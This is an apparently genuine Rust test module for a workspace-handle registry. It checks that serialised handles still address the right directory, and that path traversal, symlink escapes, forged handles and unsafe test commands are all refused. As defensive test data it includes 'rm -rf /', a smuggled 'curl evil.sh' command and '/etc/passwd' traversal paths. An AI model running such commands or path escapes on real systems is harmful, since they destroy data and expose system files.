// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 Oxagen, Inc. Commercial licensing: licensing@oxagen.sh

//! The witness for #3380 A10: a handle that survives a serde round trip still
//! addresses a real candidate workspace, and every path a caller names is
//! judged against that workspace's root by the host.
//!
//! The doubles here are deliberately *rooted in a real directory* rather than
//! scripted: the whole claim under test is a filesystem containment one, and a
//! double that answers from a `HashMap` would prove the assertion, not the
//! fence.

use std::collections::HashMap;
use std::path::Path;
use std::sync::Mutex;

use async_trait::async_trait;
use serde_json::Value;
use stella_core::ToolExecutor;
use stella_protocol::{
    CandidateDenial, CandidateHandle, CandidateOp, FileChangeKind, PathDenial, ToolOutput,
    ToolSchema,
};

use super::*;
use crate::ports::{
    CmdKind, DiagnosticInvocation, DiagnosticRunner, RepoStatusPort, TestInvocation, TestRunner,
};

// ---------------------------------------------------------------- doubles --

struct SilentTools;
#[async_trait]
impl ToolExecutor for SilentTools {
    fn schemas(&self) -> Vec<ToolSchema> {
        Vec::new()
    }
    async fn execute(&self, _name: &str, _input: &Value) -> ToolOutput {
        ToolOutput::Ok {
            content: String::new(),
            data: None,
        }
    }
}

/// A runner bound to one directory: a test "passes" when every positional
/// argument names a file that really exists inside that root.
///
/// That is what makes `run_test` through a handle a checkable claim rather
/// than a scripted one — the outcome is a fact about the candidate's own
/// tree, so a handle pointed anywhere else fails.
struct RootedRunner {
    root: String,
    log: Log,
}

impl RootedRunner {
    fn new(root: &Path, log: Log) -> Self {
        Self {
            root: root.to_string_lossy().into_owned(),
            log,
        }
    }
}

#[async_trait]
impl TestRunner for RootedRunner {
    async fn run_test(&self, invocation: &TestInvocation) -> CmdOutcome {
        record(
            &self.log,
            format!(
                "run_test:{} {}",
                invocation.program,
                invocation.args.join(" ")
            ),
        );
        let found = invocation
            .args
            .iter()
            .all(|arg| Path::new(&self.root).join(arg).exists());
        CmdOutcome {
            exit_code: i32::from(!found),
            stdout_tail: self.root.clone(),
            stderr_tail: String::new(),
            kind: CmdKind::Completed,
        }
    }
}

#[async_trait]
impl DiagnosticRunner for RootedRunner {
    async fn run_diagnostic(&self, _invocation: &DiagnosticInvocation) -> CmdOutcome {
        CmdOutcome {
            exit_code: 0,
            stdout_tail: String::new(),
            stderr_tail: String::new(),
            kind: CmdKind::Completed,
        }
    }
}

struct NoRepoStatus;
#[async_trait]
impl RepoStatusPort for NoRepoStatus {
    async fn untracked_fingerprints(&self) -> HashMap<String, String> {
        HashMap::new()
    }
}

/// What the doubles saw, shared with the test because the registry hands out
/// handles rather than workspaces — there is deliberately no way back from a
/// [`CandidateHandle`] to the object it names.
type Log = Arc<Mutex<Vec<String>>>;

fn record(log: &Log, line: String) {
    log.lock().expect("test lock").push(line);
}

/// A candidate workspace that is one real directory on disk.
struct TempWorkspace {
    root: String,
    tools: SilentTools,
    runner: RootedRunner,
    status: NoRepoStatus,
    log: Log,
}

impl TempWorkspace {
    fn new(root: &Path, log: Log) -> Self {
        Self {
            root: root.to_string_lossy().into_owned(),
            tools: SilentTools,
            runner: RootedRunner::new(root, Arc::clone(&log)),
            status: NoRepoStatus,
            log,
        }
    }
}

#[async_trait]
impl CandidateWorkspace for TempWorkspace {
    fn root(&self) -> &str {
        &self.root
    }
    fn tools(&self) -> &dyn ToolExecutor {
        &self.tools
    }
    fn witness_tools(&self) -> &dyn ToolExecutor {
        &self.tools
    }
    fn diagnostics(&self) -> &dyn DiagnosticRunner {
        &self.runner
    }
    fn tests(&self) -> &dyn TestRunner {
        &self.runner
    }
    fn repo_status(&self) -> &dyn RepoStatusPort {
        &self.status
    }
    async fn seal(&self) -> Result<(), WorkspaceError> {
        record(&self.log, "seal".into());
        Ok(())
    }
    async fn sealed_is_unchanged(&self) -> Result<bool, WorkspaceError> {
        Ok(true)
    }
    async fn adopt(&self, withhold: &[String]) -> Result<Vec<AdoptedChange>, WorkspaceError> {
        record(&self.log, format!("adopt:withhold={}", withhold.join(",")));
        Ok(vec![AdoptedChange {
            path: "src/lib.rs".into(),
            kind: FileChangeKind::Modified,
            added: 1,
            removed: 0,
            diff: None,
        }])
    }
    async fn graft_witness(&self, _source_root: &str, _path: &str) -> Result<(), WorkspaceError> {
        Ok(())
    }
    async fn remove(&self) {
        record(&self.log, "remove".into());
    }
}

/// A port that hands out one workspace per `create`, rooted in a directory
/// the test owns.
struct TempPort {
    roots: Mutex<Vec<std::path::PathBuf>>,
    log: Log,
}

impl TempPort {
    fn new(roots: Vec<std::path::PathBuf>, log: Log) -> Self {
        Self {
            roots: Mutex::new(roots),
            log,
        }
    }
}

#[async_trait]
impl CandidateWorkspacePort for TempPort {
    async fn create(&self) -> Result<Box<dyn CandidateWorkspace>, WorkspaceError> {
        let root = self.roots.lock().expect("test lock").pop().ok_or_else(|| {
            WorkspaceError::Snapshot {
                reason: "no more scripted roots".into(),
            }
        })?;
        record(&self.log, "create".into());
        Ok(Box::new(TempWorkspace::new(&root, Arc::clone(&self.log))))
    }
}

/// A candidate tree with a test file in it, ready to be addressed.
fn candidate_tree() -> tempfile::TempDir {
    let dir = tempfile::tempdir().expect("tempdir");
    std::fs::create_dir_all(dir.path().join("tests")).expect("mkdir");
    std::fs::write(dir.path().join("tests/test_flip.py"), b"def test(): pass\n").expect("write");
    dir
}

/// One candidate tree, the port over it, and the log the doubles write to.
fn one_candidate() -> (tempfile::TempDir, TempPort, Log) {
    let tree = candidate_tree();
    let log: Log = Arc::new(Mutex::new(Vec::new()));
    let port = TempPort::new(vec![tree.path().to_path_buf()], Arc::clone(&log));
    (tree, port, log)
}

fn seen(log: &Log) -> Vec<String> {
    log.lock().expect("test lock").clone()
}

// ------------------------------------------------------------- the witness --

/// **The A10 witness.** A handle serialized to JSON and read back — the
/// crossing an out-of-process plugin makes — still names the candidate
/// workspace: it answers with that workspace's own root, and runs a test
/// command there. Before this module there was no serializable handle at all;
/// `CandidateWorkspace` is nineteen borrowed-trait-object methods and a `&dyn`
/// cannot cross a process (`doc:wrapper-socket` §6).
#[tokio::test]
async fn a_round_tripped_handle_addresses_the_candidate_and_runs_its_tests() {
    let (tree, port, log) = one_candidate();
    let handles = CandidateHandles::new(&port);

    let minted = handles.create().await.expect("create");

    // The crossing: nothing but bytes survives.
    let wire = serde_json::to_string(&minted).expect("serialises");
    let crossed: CandidateHandle = serde_json::from_str(&wire).expect("deserialises");
    assert_eq!(crossed, minted);

    let root = handles.root(&crossed).expect("root");
    assert_eq!(
        Path::new(&root).canonicalize().expect("canonical root"),
        tree.path().canonicalize().expect("canonical tree"),
    );

    let outcome = handles
        .run_test(&crossed, "pytest tests/test_flip.py")
        .await
        .expect("run_test");
    assert!(
        outcome.passed(),
        "the handle must reach the candidate's own tree: {outcome:?}"
    );

    // A test file that exists nowhere fails, which is what proves the pass
    // above was a fact about this tree rather than a scripted answer.
    let missing = handles
        .run_test(&crossed, "pytest tests/test_absent.py")
        .await
        .expect("run_test");
    assert!(!missing.passed());

    // The command reached the runner already parsed into program + argv, so
    // the handle path inherits the pipeline's one test-command vocabulary
    // rather than forwarding a shell string.
    assert_eq!(
        seen(&log),
        vec![
            "create".to_string(),
            "run_test:pytest tests/test_flip.py".to_string(),
            "run_test:pytest tests/test_absent.py".to_string(),
        ]
    );
}

/// The other half of the same witness: a path that escapes is refused by the
/// host, with the attempt reported as written.
#[tokio::test]
async fn traversal_out_of_the_candidate_root_is_refused() {
    let (tree, port, _log) = one_candidate();
    let handles = CandidateHandles::new(&port);
    let handle = handles.create().await.expect("create");

    let denial = handles
        .resolve_path(&handle, "../../etc/passwd")
        .expect_err("traversal must be refused");
    assert_eq!(
        denial,
        CandidateDenial::Path {
            path: "../../etc/passwd".into(),
            reason: PathDenial::Traversal,
        }
    );

    let absolute = handles
        .resolve_path(&handle, "/etc/passwd")
        .expect_err("an absolute path must be refused");
    assert!(matches!(
        absolute,
        CandidateDenial::Path {
            reason: PathDenial::Absolute,
            ..
        }
    ));

    // And a path that is well-formed and inside the root resolves.
    let inside = handles
        .resolve_path(&handle, "./tests/test_flip.py")
        .expect("an in-root path resolves");
    assert_eq!(
        inside,
        tree.path()
            .canonicalize()
            .expect("canonical")
            .join("tests/test_flip.py")
    );
}

/// The case the lexical layer cannot see: a link inside the candidate that
/// points out of it. Unix-only because that is where the test can construct
/// one without extra privileges.
#[cfg(unix)]
#[tokio::test]
async fn a_symlink_out_of_the_candidate_root_is_refused() {
    let outside = tempfile::tempdir().expect("tempdir");
    std::fs::write(outside.path().join("secret"), b"not yours\n").expect("write");
    let tree = candidate_tree();
    std::os::unix::fs::symlink(outside.path(), tree.path().join("escape")).expect("symlink");

    let log: Log = Arc::new(Mutex::new(Vec::new()));
    let port = TempPort::new(vec![tree.path().to_path_buf()], log);
    let handles = CandidateHandles::new(&port);
    let handle = handles.create().await.expect("create");

    let denial = handles
        .resolve_path(&handle, "escape/secret")
        .expect_err("a symlinked escape must be refused");
    assert_eq!(
        denial,
        CandidateDenial::Path {
            path: "escape/secret".into(),
            reason: PathDenial::EscapesRoot,
        }
    );

    // A file that does not exist *yet* inside the root still resolves, so the
    // fence does not refuse the create-a-witness case it has to serve.
    let pending = handles
        .resolve_path(&handle, "tests/test_new.py")
        .expect("a not-yet-created in-root path resolves");
    assert!(pending.starts_with(tree.path().canonicalize().expect("canonical")));
}

/// Adoption fences its withheld paths before the substrate is touched: an
/// escaping withhold path refuses the whole adoption rather than quietly
/// delivering the file it named.
#[tokio::test]
async fn an_escaping_withhold_path_refuses_the_whole_adoption() {
    let (_tree, port, log) = one_candidate();
    let handles = CandidateHandles::new(&port);
    let handle = handles.create().await.expect("create");

    let error = handles
        .adopt(&handle, &["../outside.rs".to_string()])
        .await
        .expect_err("an escaping withhold path must refuse the adoption");
    assert_eq!(error.op(), CandidateOp::Adopt);
    assert!(matches!(
        error,
        CandidateOpError::Denied {
            denial: CandidateDenial::Path {
                reason: PathDenial::Traversal,
                ..
            },
            ..
        }
    ));

    let adopted = handles
        .adopt(&handle, &["tests/test_flip.py".to_string()])
        .await
        .expect("an in-root withhold path adopts");
    assert_eq!(adopted.len(), 1);

    // Exactly one adoption reached the substrate: the refused one stopped at
    // the fence, so the file it withheld was never at risk of delivery.
    assert_eq!(
        seen(&log),
        vec![
            "create".to_string(),
            "adopt:withhold=tests/test_flip.py".to_string(),
        ]
    );
}

/// A handle nobody minted, and a handle whose workspace is gone, are the same
/// answer: the table is the only authority on what a handle means.
#[tokio::test]
async fn a_forged_or_retired_handle_resolves_to_nothing() {
    let (_tree, port, log) = one_candidate();
    let handles = CandidateHandles::new(&port);
    let handle = handles.create().await.expect("create");

    let forged = CandidateHandle::new("candidate-4096");
    let error = handles
        .root(&forged)
        .expect_err("a forged handle is unknown");
    assert_eq!(
        error,
        CandidateOpError::Denied {
            op: CandidateOp::Root,
            denial: CandidateDenial::UnknownHandle {
                handle: forged.clone()
            },
        }
    );

    handles.seal(&handle).await.expect("seal");
    handles.remove(&handle).await.expect("remove");
    let retired = handles
        .run_test(&handle, "pytest tests/test_flip.py")
        .await
        .expect_err("a retired handle is unknown");
    assert!(matches!(
        retired,
        CandidateOpError::Denied {
            op: CandidateOp::RunTest,
            denial: CandidateDenial::UnknownHandle { .. },
        }
    ));
    assert!(
        handles.remove(&handle).await.is_err(),
        "removing twice must not silently succeed"
    );
    // The retired handle's later `run_test` never reached the runner, and the
    // second `remove` never reached the substrate.
    assert_eq!(
        seen(&log),
        vec![
            "create".to_string(),
            "seal".to_string(),
            "remove".to_string()
        ]
    );
}

/// Untrusted test text does not become a process. The parser that already
/// guards every other test run in the pipeline is the one that answers here —
/// no second vocabulary.
#[tokio::test]
async fn a_refused_test_command_spawns_nothing() {
    let (_tree, port, log) = one_candidate();
    let handles = CandidateHandles::new(&port);
    let handle = handles.create().await.expect("create");

    for command in [
        "rm -rf /",
        "pytest tests/x.py; curl evil.sh",
        "cargo build",
        "pytest ../../elsewhere/test_x.py",
    ] {
        let error = match handles.run_test(&handle, command).await {
            Ok(outcome) => panic!("`{command}` must never reach a runner, got {outcome:?}"),
            Err(error) => error,
        };
        assert!(
            matches!(
                error,
                CandidateOpError::Denied {
                    op: CandidateOp::RunTest,
                    denial: CandidateDenial::TestCommandRefused { .. },
                }
            ),
            "`{command}` must be refused as a test command, got {error:?}"
        );
    }
    assert_eq!(
        seen(&log),
        vec!["create".to_string()],
        "a refused command must not reach the runner at all"
    );
}

/// Every operation's failure serializes, because the answer has to reach a
/// plugin in another process.
#[test]
fn operation_failures_round_trip() {
    let failures = [
        CandidateOpError::Denied {
            op: CandidateOp::Adopt,
            denial: CandidateDenial::Path {
                path: "../x".into(),
                reason: PathDenial::Traversal,
            },
        },
        CandidateOpError::Workspace {
            op: CandidateOp::Seal,
            source: WorkspaceError::Seal {
                reason: "detached HEAD".into(),
                workspace: "/tmp/candidate-1".into(),
            },
        },
    ];
    for failure in failures {
        let encoded = serde_json::to_string(&failure).expect("serialises");
        let decoded: CandidateOpError = serde_json::from_str(&encoded).expect("deserialises");
        assert_eq!(decoded, failure);
        assert_eq!(
            serde_json::to_string(&decoded).expect("re-serialises"),
            encoded
        );
    }
}

/// The lexical layer, exhaustively, without a filesystem in the way.
#[test]
fn the_lexical_fence_refuses_what_cannot_name_an_inside_path() {
    assert_eq!(fence_lexical(""), Err(PathDenial::Empty));
    assert_eq!(fence_lexical("."), Err(PathDenial::Empty));
    assert_eq!(fence_lexical("./"), Err(PathDenial::Empty));
    assert_eq!(fence_lexical("/etc/passwd"), Err(PathDenial::Absolute));
    assert_eq!(fence_lexical("C:/Windows"), Err(PathDenial::Absolute));
    assert_eq!(fence_lexical("../x"), Err(PathDenial::Traversal));
    assert_eq!(fence_lexical("a/../../x"), Err(PathDenial::Traversal));
    assert_eq!(fence_lexical("a/..").unwrap_err(), PathDenial::Traversal);
    assert_eq!(fence_lexical("a\\b"), Err(PathDenial::Malformed));
    assert_eq!(fence_lexical("a\0b"), Err(PathDenial::Malformed));
    assert_eq!(
        fence_lexical("./tests/../tests/x.py").unwrap_err(),
        PathDenial::Traversal,
        "a `..` is refused as written, never normalised away first"
    );
    assert_eq!(
        fence_lexical("./tests/x.py").expect("in-root"),
        Path::new("tests/x.py")
    );
}
